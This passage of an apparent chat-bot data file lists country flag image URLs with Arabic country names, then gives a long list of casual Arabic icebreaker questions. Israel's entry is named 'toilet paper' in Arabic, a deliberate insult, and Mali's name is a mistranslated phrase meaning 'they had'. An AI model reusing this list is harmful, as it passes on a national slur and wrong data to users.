            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Central-African-Republic.png",
            "name": "افريقيا الوسطى"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Chad.png",
            "name": "تشاد"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Chile.png",
            "name": "تشيلي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-China.png",
            "name": "الصين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Colombia.png",
            "name": "كولومبيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Comoros.png",
            "name": "جزر القمر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Congo-Democratic-Republic-of.png",
            "name": "الكونغو الديمقراطية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Congo.png",
            "name": "الكونغو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Costa-Rica.png",
            "name": "كوستا ريكا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Cote-d-Ivoire.png",
            "name": "ساحل العاج"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Croatia.png",
            "name": "كرواتيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Cuba.png",
            "name": "كوبا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Cyprus.png",
            "name": "قبرص"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Czech-Republic.png",
            "name": "التشيك"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Denmark.png",
            "name": "الدنمارك"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Djibouti.png",
            "name": "جيبوتي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Dominica.png",
            "name": "دومينيكا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Dominican-Republic.png",
            "name": "الدومينيكان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Ecuador.png",
            "name": "الاكوادور"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Egypt.png",
            "name": "مصر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-El-Salvador.png",
            "name": "السلفادور"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Equatorial-Guinea.png",
            "name": "غينيا الاستوائية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Eritrea.png",
            "name": "اريتريا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Estonia.png",
            "name": "استونيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Eswatini.png",
            "name": "إسواتيني"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Ethiopia.png",
            "name": "اثيوبيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Fiji.png",
            "name": "فيجي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Finland.png",
            "name": "فنلندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-France.png",
            "name": "فرنسا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Gabon.png",
            "name": "الجابون"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Gambia.png",
            "name": "غامبيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Georgia.png",
            "name": "جورجيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Germany.png",
            "name": "المانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Ghana.png",
            "name": "غانا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Greece.png",
            "name": "اليونان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Grenada.png",
            "name": "غرينادا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Guatemala.png",
            "name": "غواتيمالا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Guinea.png",
            "name": "غينيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Guinea-Bissau.png",
            "name": "غينيا بيساو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Guyana.png",
            "name": "غيانا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Haiti.png",
            "name": "هايتي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Honduras.png",
            "name": "هندوراس"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Hungary.png",
            "name": "هنغاريا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Iceland.png",
            "name": "ايسلندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-India.png",
            "name": "الهند"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Indonesia.png",
            "name": "اندونيسيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Iran.png",
            "name": "ايران"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Iraq.png",
            "name": "العراق"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Ireland.png",
            "name": "ايرلندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Israel.png",
            "name": "ورق حمام"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Italy.png",
            "name": "ايطاليا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Jamaica.png",
            "name": "جامايكا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Japan.png",
            "name": "اليابان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Jordan.png",
            "name": "الاردن"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Kazakhstan.png",
            "name": "كازاخستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Kenya.png",
            "name": "كينيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Kiribati.png",
            "name": "كيريباتي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Kosovo.png",
            "name": "كوسوفو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Kuwait.png",
            "name": "الكويت"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Kyrgyzstan.png",
            "name": "قيرغيزستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Laos.png",
            "name": "لاوس"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Latvia.png",
            "name": "لاتفيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Lebanon.png",
            "name": "لبنان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Lesotho.png",
            "name": "ليسوتو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Liberia.png",
            "name": "ليبيريا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Libya.png",
            "name": "ليبيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Liechtenstein.png",
            "name": "ليختنشتاين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Lithuania.png",
            "name": "ليتوانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Luxembourg.png",
            "name": "لوكسمبورغ"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Madagascar.png",
            "name": "مدغشقر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Malawi.png",
            "name": "ملاوي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Malaysia.png",
            "name": "ماليزيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Maldives.png",
            "name": "جزر المالديف"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Mali.png",
            "name": "كان لديهم"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Malta.png",
            "name": "مالطا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Marshall-Islands.png",
            "name": "جزر مارشال"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Mauritania.png",
            "name": "موريتانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Mauritius.png",
            "name": "موريشيوس"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Mexico.png",
            "name": "المكسيك"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Micronesia.png",
            "name": "ميكرونيزيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Moldova.png",
            "name": "مولدافيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Monaco.png",
            "name": "موناكو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Mongolia.png",
            "name": "منغوليا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Montenegro.png",
            "name": "الجبل الاسود"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Morocco.png",
            "name": "المغرب"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Mozambique.png",
            "name": "موزمبيق"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Myanmar.png",
            "name": "ميانمار"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Namibia.png",
            "name": "ناميبيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Nauru.png",
            "name": "ناورو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Nepal.png",
            "name": "نيبال"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Netherlands.png",
            "name": "هولندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-New-Zealand.png",
            "name": "نيوزيلاندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Nicaragua.png",
            "name": "نيكاراغوا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Niger.png",
            "name": "النيجر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Nigeria.png",
            "name": "نيجيريا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Korea-North.png",
            "name": "كوريا الشمالية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-North-Macedonia.png",
            "name": "مقدونيا الشمالية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Norway.png",
            "name": "النرويج"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Oman.png",
            "name": "عمان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Pakistan.png",
            "name": "باكستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Palau.png",
            "name": "بالاو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Palestine.png",
            "name": "فلسطين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Panama.png",
            "name": "بنما"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Papua-New-Guinea.png",
            "name": "بابوا غينيا الجديدة"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Paraguay.png",
            "name": "باراغواي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Peru.png",
            "name": "بيرو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Philippines.png",
            "name": "الفلبين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Poland.png",
            "name": "بولندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Portugal.png",
            "name": "البرتغال"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Qatar.png",
            "name": "قطر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Romania.png",
            "name": "رومانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Russia.png",
            "name": "روسيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Rwanda.png",
            "name": "رواندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-St-Kitts-Nevis.png",
            "name": "سانت كيتس ونيفيس"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-St-Lucia.png",
            "name": "سانت لوسيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-St-Vincent-the-Grenadines.png",
            "name": "سانت فنسنت والجرينادينز"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Samoa.png",
            "name": "ساموا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-San-Marino.png",
            "name": "سان مارينو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Sao-Tome-and-Principe.png",
            "name": "ساو تومي وبرينسيبي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Saudi-Arabia.png",
            "name": "السعودية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Senegal.png",
            "name": "السنغال"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Serbia.png",
            "name": "صربيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Seychelles.png",
            "name": "سيشيل"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Sierra-Leone.png",
            "name": "سيراليون"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Singapore.png",
            "name": "سنغافورة"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Slovakia.png",
            "name": "سلوفاكيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Slovenia.png",
            "name": "سلوفينيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Solomon-Islands.png",
            "name": "جزر سليمان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Somalia.png",
            "name": "الصومال"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-South-Africa.png",
            "name": "جنوب افريقيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Korea-South.png",
            "name": "كوريا الجنوبية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-South-Sudan.png",
            "name": "جنوب السودان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Spain.png",
            "name": "اسبانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Sri-Lanka.png",
            "name": "سريلانكا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Sudan.png",
            "name": "السودان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Suriname.png",
            "name": "سورينام"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Sweden.png",
            "name": "السويد"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Switzerland.png",
            "name": "سويسرا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Syria.png",
            "name": "سوريا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Taiwan.png",
            "name": "تايوان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Tajikistan.png",
            "name": "طاجيكستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Tanzania.png",
            "name": "تنزانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Thailand.png",
            "name": "تايلاند"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Timor-Leste.png",
            "name": "تيمور الشرقية"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Togo.png",
            "name": "توجو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Tonga.png",
            "name": "تونغا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Trinidad-and-Tobago.png",
            "name": "ترينيداد"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Tunisia.png",
            "name": "تونس"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Turkey.png",
            "name": "تركيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Turkmenistan.png",
            "name": "تركمانستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Tuvalu.png",
            "name": "توفالو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Uganda.png",
            "name": "اوغندا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Ukraine.png",
            "name": "اوكرانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-United-Arab-Emirates.png",
            "name": "الامارات"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-United-Kingdom.png",
            "name": "بريطانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-United-States-of-America.png",
            "name": "امريكا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Uruguay.png",
            "name": "اوروغواي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Uzbekistan.png",
            "name": "اوزبكستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Vanuatu.png",
            "name": "فانواتو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Vatican-City.png",
            "name": "الفاتيكان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Venezuela.png",
            "name": "فنزويلا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Vietnam.png",
            "name": "فيتنام"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Yemen.png",
            "name": "اليمن"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Zambia.png",
            "name": "زامبيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Zimbabwe.png",
            "name": "زيمبابوي"
        }
]

cut = [
            "لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .",
            "شخص تحب تستفزه ؟",
            "لو حلمت في شخص وصحيت وحصلت رساله من نفس الشخص . ارسل ايموجيي مثل ردة فعلك.",
            "هات صورة تحس إنك ابدعت بتصويرها.",
            "على إيش سهران ؟",
            "مين تتوقع يطالعك طول الوقت بدون ملل ؟",
            "وين جالس الحين ؟",
            "كم من عشرة تقيم يومك ؟",
            "أطول مدة نمت فيها كم ساعه ؟",
            "أجمل سنة ميلادية مرت عليك ؟",
            "أخر رسالة بالواتس جاتك من مين ؟",
            "ليه مانمت ؟",
            "تعتقد فيه أحد يراقبك ؟",
            "كم من عشره تعطي حظك ؟",
            "كلمه ماسكه معك الفترة هذي ؟",
            "شيء مستحيل تمل منه ؟",
            "متى تنام بالعادة ؟",
            "كم من عشرة جاهز للدراسة ؟",
            "منشن صديقك الفزعة",
            "يوم نفسك يرجع بكل تفاصيله ؟",
            "أجمل صورة بجوالك ؟",
            "ايش أغرب مكان قد صحتوا فيه؟",
            "اذا جاك خبر مفرح اول واحد تعلمه فيه مين ؟",
            "شيء لو يختفي تصير الحياة جميلة ؟",
            "كم من عشرة تشوف نفسك محظوظ ؟",
            "امدح نفسك بكلمة وحدة بس",
            "كلمة لأقرب شخص لقلبك ؟",
            "قوة الصداقة بالمدة ولا بالمواقف ؟",
            "تتابع مسلسلات ولا م تهتم ؟",
            "تاريخ يعني لك الكثير ؟",
            "كم عدد اللي معطيهم بلوك ؟",
            "من الغباء انك ؟",
            "اكثر شيء محتاجه الحين ؟",
            "ايش مسهرك ؟.",
            "حزين ولا مبسوط ؟",
            "تحب سوالف مين ؟",
            "كم من عشرة روتينك ممل ؟",
            "شيء مستحيل ترفضه ؟.",
            "كم من عشرة الإيجابية فيك ؟.",
            "تعتقد اشباهك الاربعين عايشين حياة حلوة ؟.",
            "مين جالس عندك ؟",
            "كم من عشرة تشوف نفسك انسان ناجح ؟",
            "شيء حظك فيه حلو ؟.",
            "كم من عشرة الصبر عندك ؟",
            "أخر مرة نزل عندكم مطر ؟",
            "اكثر مشاكلك بسبب ؟",
            "اكره شعور ممكن يحسه انسان ؟",
            "شخص تحب تنشبله ؟",
            "تنتظر شيء ؟",
            "جربت تسكن وحدك ؟",
            "اكثر لونين تحبهم مع بعض ؟",
            "متى تكره نفسك ؟",
            "كم من عشرة مروق ؟",
            "مدينة تتمنى تعيش وتستقر فيها طول عمرك ؟",
            "لو للحياة لون إيش بيكون لون حياتك ؟",
            "ممكن في يوم من الأيام تصبح شخص نباتي ؟.",
            "عمرك قابلت شخص يشبهك ؟",
            "اخر شخص تهاوشت معه ؟",
            "قبل ساعة ايش كنت تسوي ؟",
            "كلمة تقولها للي ببالك ؟",
            "أكثر شيء مضيع وقتك فيه ؟",
            "لو فتحتا خزانتك إيش اكثر لون بنشوف ؟",
            "قوة خارقة تتمنى تمتلكها ؟",
            "اكثر مصايبك مع مين ؟",
            "اذا زعلت إيش يرضيك ؟",
            "من النوع اللي تعترف بسرعه ولا تجحد ؟",
            "من الاشياء البسيطة اللي تسعدك ؟",
            "اخر مره بكيت",
            "ايموجي يعبر عن وضعك الحين ؟",
            "التاريخ المنتظر بالنسبة لك ؟",
            "كلنا بنسمعك إيش بتقول ؟",
            "مدينتك اللي ولدت فيها ؟",
            "عندك شخص مستحيل يمر يوم وما تكلمه ؟",
            "كلمة تقولها لنفسك ؟",
            "كم من عشرة متفائل بالمستقبل ؟",
            "ردك المعتاد اذا أحد ناداك ؟",
            "أكثر كلمه تسمعها من أمك ؟",
            "إيش تفضل عمل ميداني ولاعمل مكتبي ؟",
            "أكثر حيوان تحبه ؟",
            "اكثر مشاكلك بسبب ؟",
            "اكثر صوت تكرهه ؟",
            "اشياء تتمنى انها م تنتهي ؟",
            "اشياء صعب تتقبلها بسرعه ؟",
            "كم من عشرة راضي عن وضعك الحالي ؟",
            "متى م تقدر تمسك ضحكتك ؟",
            "اخر شخص قالك كلمة حلوة ؟",
            "اكثر شيء تحبه بنفسك ؟",
            "شيء نفسك يرجع ؟",
            "اغلب وقتك ضايع على ؟",
            "كيف تعرفت على اعز صديق لك ؟",
            "شايل هم شيء الفترة هذي ؟",
            "شخص م تحب تناقشه ؟",
            "تقييمك للديسكورد الفترة هذي ؟",
            "من النوع اللي اذا حطيت راسك على المخده نمت ولا تحتاج وقت ",
            "اهم برنامج عندك بالجوال الفترة هذي ؟",
            "كم تعطي نفسك من عشرة بتعاملك مع مشاكلك ؟",
            "اشياء تبين عليك اذا زعلت ؟",
            "كم من عشرة تحب الجلسة بالبيت ؟",
            "أطول مكالمة لك كم كانت مدتها ؟",
            "اسم تحس صاحبه فخم ؟",
            "تتكلم أكثر ولا تسمع ؟",
            "كم من عشرة تحب النوم ؟",
            "اخر شيء اكلته ؟",
            "أكثر مكان سافرت له بخيالك ؟",
            "كبرت وللحين اخاف من ؟",
            "كيف حالك وانت لحالك ؟",
            "أكثر اسم تحبه ؟.",
            "اكبر مبلغ ضاع منك ؟",
            "كلمة تختصر وضعك الحين ؟",
            "نظام نومك ...",
            "أكثر مكان تجلس فيه غير غرفتك ؟",
            "حرف تحبه ؟",
            "كم درجة الحرارة بمدينتك ؟",
            "تعطي اللي غلط بحقك فرصة ؟",
            "حياتك بكلمة ؟",
            "عندك مليون ريال بس مايمديك تشتري الا شيء  يبدأ بأول حرف من اسمك. وش بتشتري ؟",
            "اكثر شيء ساحب عليه الفترة هذي ؟",
            "شيء مستحيل تعطيه أحد ؟",
            "تنتظر شيء ؟",
            "ايش الوظيفة التي تستحق أعلى راتب؟",
            "كم مره تشحن جوالك باليوم ؟",
            "كم من عشرة عندك امل انك تصير مليونير ؟",
            "اشياء م تسويها غير اذا كنت مروق ؟",
            "لو بيدك تغير بالزمن, تقدمه ولا ترجعه ؟.",
            "دولة امنيتك تزورها ؟.",
            "اكثر  شخص فاهمك بالدنيا ؟",
            "تسامح بسرعة ؟.",
            "كم تحتاج وقت عشان تتعود على مكان جديد ؟",
            "كم من عشرة تحب الهدوء ؟",
            "تاريخ مهم جداً عندك ؟",
            "لعبة تشوف نفسك فنان فيها ؟",
            "أصعب قرار ممكن تتخذه ؟",
            "شيء نفسك تجربه ؟",
            "أشياء توترك ؟",
            "كم من عشرة تحب الاطفال ؟.",
            "اكثر شخص تتهاوش معه ؟",
            "لو خيروك بين يعطونك مليون أو راتب شهري متوسط بدون عمل مدى الحياة إيش تختار ؟",
            "الفلوس كل شيء ؟",
            "عشان تعيش مرتاح ؟",
            "ردة فعلك لو شفت شخص يبكي قدامك ؟",
            "كم مره أخذت عمره بـ رمضان ؟",
            "ردة فعلك لو مزح معك شخص م تعرفه ؟",
            "شيء تشوف نفسك مبدع فيه ؟",
            "ماذا تفعل الان ؟ ",
            "كم من عشرة تحب حياتك ؟.",
            "كم عدد الصور بجوالك ؟.",
            "كم عدد اصحابك المقربين منك كثير ؟.",
            "شكراً لأنك في حياتي ..تقولها لمين ؟",
            "كيف تتعامل مع الشخص اللي يرد متأخر دائماً ؟.",
            "اللوان داكنة  ولا فاتحه؟",
            "كيف تتعامل مع الاشخاص السلبيين ؟",
            "دايم الانطباع الاول عنك إنك شخص ؟",
            "شيء حلو صار لك اليوم ؟",
            "اول شيء يلفت انتباهك بشخص اول مرة تقابله ؟.",
            "جماد م تستغني عنه ؟.",
            "مع ، ضد : البكاء يقلل التوتر ..!",
            "إيش كان نكك ايام البيبي ؟.",
            "من النوع اللي تحفظ اسامي الناس  بسرعه ولا بس اشكالهم ؟.",
            "لو كان لك الحرية تغير اسمك إيش راح تختار اسم ؟",
            "اكثر شيء ضيعت عليه فلوسك ؟",
            "تعرف تمسك نفسك اذا عصبت ؟",
            "عمرك شاركت بمسابقة وربحت ؟",
            "إيش لون جوالك ؟.",
            "تعتقد إنك انسان لك فايدة ؟",
            "اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟",
            "أطول صداقة بينك وبين شخص كم مدتها ؟.",
            "تعرف تعبر عن الكلام اللي بداخلك ؟",
            "ردة فعلك اذا انحشرت بالنقاش ؟",
            "بالعادة برمضان تنحف ولاتسمن ؟",
            "تمارس رياضة معينة برمضان ؟",
            "عندك فوبيا من شيء ؟.",
            "الساعة كم اذان الفجر عندكم ؟",
            "شيء من الماضي للحين عندك ؟.",
            "عندك شخص انت حييل جريء معاه و ما تستحي منه ؟",
            "عمرك انتقمت من شخص؟",
            "اكثر شي يتعبك بالصيام العطش ولا الجوع ؟",
            "اكثر شخص يتصل عليك بالواتس ؟",
            "متى اخر مره جربت شعور ليتني سكت بس ؟",
            "اسم ولد وبنت تحسهم لايقين على بعض ؟.",
            "مسلسل ناوي تشوفه ؟",
            "عادي تتغير عشان شخص تحبه ؟",
            "شيء كل م تذكرته تستانس؟",
            "ايامك هالفترة عبارة عن ؟",
            "منشن شخصين تحسهم نفس الاسلوب او الشخصية ..",
            "اكثر شيء بتشتاق له اذا جاء رمضان ؟",
            "كم مره سامحت بقلبك بس عقلك رافض هالشيء ؟.",
            "مع او ضد .. البنت تحب انشاء المشاكل في العلاقات ..",
            "ماهي طريقتك في معاتبة شخص ؟",
            "لو كنت محتار بين شخص تحبه وشخص يحبك، من تختار؟",
            "الشيء الي تحسه يجذبك للشخص هو ؟",
            "اكثر شخص بينك وبينه تواصل دائم ؟",
            "اعلى نسبة جبتها بحياتك الدراسية ؟",
            "شايل هم شيء ؟ ",
            "إيش تفضل صح وخطأ ولا خيارات ؟",
            "اكثر ايموجي تستخدمه ؟",
            "جربت ينسحب جوالك فترة الاختبارات ؟.",
            "مادة دايم تجيب العيد فيها ؟",
            "وجبة ساحب عليها ؟",
            "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟",
            "مادة تكرها بس درجاتك عالية فيها ؟",
            "شيء بسيط قادر يعدل مزاجك بشكل سريع ؟",
